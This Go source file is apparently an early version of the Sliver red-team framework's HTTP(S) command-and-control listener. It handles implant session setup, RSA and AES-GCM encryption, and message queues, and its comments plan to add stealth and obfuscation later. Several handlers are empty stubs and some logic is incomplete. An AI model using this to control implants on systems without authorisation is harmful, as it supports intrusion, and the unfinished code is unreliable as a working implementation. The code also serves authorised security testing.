package c2

import (
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"io/ioutil"
	"log"
	"net/http"
	"sliver/server/assets"
	"sliver/server/certs"
	"sliver/server/core"
	"sliver/server/cryptography"
	"sync"
	"time"

	pb "sliver/protobuf/sliver"
	sliverpb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
	"github.com/gorilla/mux"
)

const (
	defaultHTTPTimeout = time.Second * 60
)

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID            string
	Sliver        *core.Sliver
	Key           cryptography.AESKey
	LastCheckin   time.Time
	replay        map[string]bool // Sessions are mutex'd
	msgQueue      [][]byte
	msgQueueMutex *sync.Mutex
}

// Push - FIFO Push a message into the queue
func (s *HTTPSession) Push(msg []byte) {
	s.msgQueueMutex.Lock()
	defer s.msgQueueMutex.Unlock()
	s.msgQueue = append(s.msgQueue, msg)
}

// Pop - FIFO Pop a message from the queue
func (s *HTTPSession) Pop() []byte {
	s.msgQueueMutex.Lock()
	defer s.msgQueueMutex.Unlock()
	if len(s.msgQueue) == 0 {
		return nil
	}
	msg := s.msgQueue[0]
	s.msgQueue = s.msgQueue[1:]
	return msg
}

// Keeps a hash of each msg in a session to detect replay'd messages
func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
	if len(ciphertext) < 1 {
		return false
	}
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay[digest]; ok {
		return true
	}
	s.replay[digest] = true
	return false
}

type httpSessions struct {
	sessions *map[string]*HTTPSession
	mutex    *sync.RWMutex
}

func (s *httpSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.sessions)[session.ID] = session
}

func (s *httpSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return (*s.sessions)[sessionID]
}

func (s *httpSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete((*s.sessions), sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// HTTPServerConfig - Config data for servers
type HTTPServerConfig struct {
	Addr     string
	LPort    uint16
	Domain   string
	Secure   bool
	CertPath string
	KeyPath  string
}

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer *http.Server
	Conf       *HTTPServerConfig
	Sessions   *httpSessions
}

// StartHTTPSListener - Start a mutual TLS listener
func StartHTTPSListener(conf *HTTPServerConfig) *SliverHTTPC2 {
	tlsConf := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}
	server := &SliverHTTPC2{
		Conf: conf,
		Sessions: &httpSessions{
			sessions: &map[string]*HTTPSession{},
			mutex:    &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: defaultHTTPTimeout,
		ReadTimeout:  defaultHTTPTimeout,
		IdleTimeout:  defaultHTTPTimeout,
		TLSConfig:    tlsConf,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}
	return server
}

// StartHTTPListener - Start a mutual TLS listener
func StartHTTPListener(conf *HTTPServerConfig) *SliverHTTPC2 {
	log.Printf("Starting http listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		Conf: conf,
		Sessions: &httpSessions{
			sessions: &map[string]*HTTPSession{},
			mutex:    &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: defaultHTTPTimeout,
		ReadTimeout:  defaultHTTPTimeout,
		IdleTimeout:  defaultHTTPTimeout,
	}
	return server
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()

	// This is a *functional* implementation, we'll obfuscate later
	router.HandleFunc("/rsakey", s.rsaKeyHandler).Methods("GET")
	router.HandleFunc("/start", s.startSessionHandler).Methods("POST")
	router.HandleFunc("/session", s.sessionHandler).Methods("POST")
	router.HandleFunc("/poll", s.pollHandler).Methods("GET")
	router.HandleFunc("/stop", s.stopHandler).Methods("POST")

	router.Use(loggingMiddleware)

	return router
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		log.Printf("[http] %v", req.RequestURI)
		next.ServeHTTP(resp, req)
	})
}

// [ HTTP Handlers ] ---------------------------------------------------------------
// This initial implementation is designed to be functional and reliable, it has not
// been optimized for speed or stealth at this point. It contains little obfuscation
// ---------------------------------------------------------------------------------
func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
	rootDir := assets.GetRootAppDir()
	certPEM, _, _ := certs.GetServerRSACertificatePEM(rootDir, "slivers", s.Conf.Domain, false)
	resp.Write(certPEM)
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	rootDir := assets.GetRootAppDir()
	publicKeyPEM, privateKeyPEM, err := certs.GetServerRSACertificatePEM(rootDir, "slivers", s.Conf.Domain, false)
	if err != nil {
		log.Printf("[http] Failed to fetch rsa private key")
		resp.WriteHeader(404)
		return
	}

	// RSA decrypt request body
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
	buf, _ := ioutil.ReadAll(req.Body)
	sessionInitData, err := cryptography.RSADecrypt(buf, privateKey)
	if err != nil {
		log.Printf("[http] RSA decryption failed")
		resp.WriteHeader(404)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	session := newSession()
	session.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)

	session.Sliver = &core.Sliver{
		ID:            core.GetHiveID(),
		Transport:     "http(s)",
		RemoteAddress: req.RemoteAddr,
		Send:          make(chan *pb.Envelope, 16),
		RespMutex:     &sync.RWMutex{},
		Resp:          map[uint64]chan *pb.Envelope{},
	}
	core.Hive.AddSliver(session.Sliver)
	s.Sessions.Add(session)

	data, err := cryptography.GCMEncrypt(session.Key, []byte(session.ID))
	if err != nil {
		log.Printf("[http] Failed to encrypt session identifier")
		resp.WriteHeader(404)
		return
	}
	resp.Write(data)
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {

	sessionID := mux.Vars(req)["sessionid"]
	session := s.Sessions.Get(sessionID)
	if session == nil {
		log.Printf("[http] No session with id %#v", sessionID)
		resp.WriteHeader(404)
		return
	}

	data, _ := ioutil.ReadAll(req.Body)
	body, err := cryptography.GCMDecrypt(session.Key, data)
	if err != nil {
		log.Printf("[http] GCM decryption failed %v", err)
		resp.WriteHeader(404)
		return
	}
	envelope := &sliverpb.Envelope{}
	proto.Unmarshal(body, envelope)

}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {

}

func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {

}

func newSession() *HTTPSession {
	return &HTTPSession{
		ID:            newHTTPSessionID(),
		LastCheckin:   time.Now(),
		msgQueue:      [][]byte{},
		msgQueueMutex: &sync.Mutex{},
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}
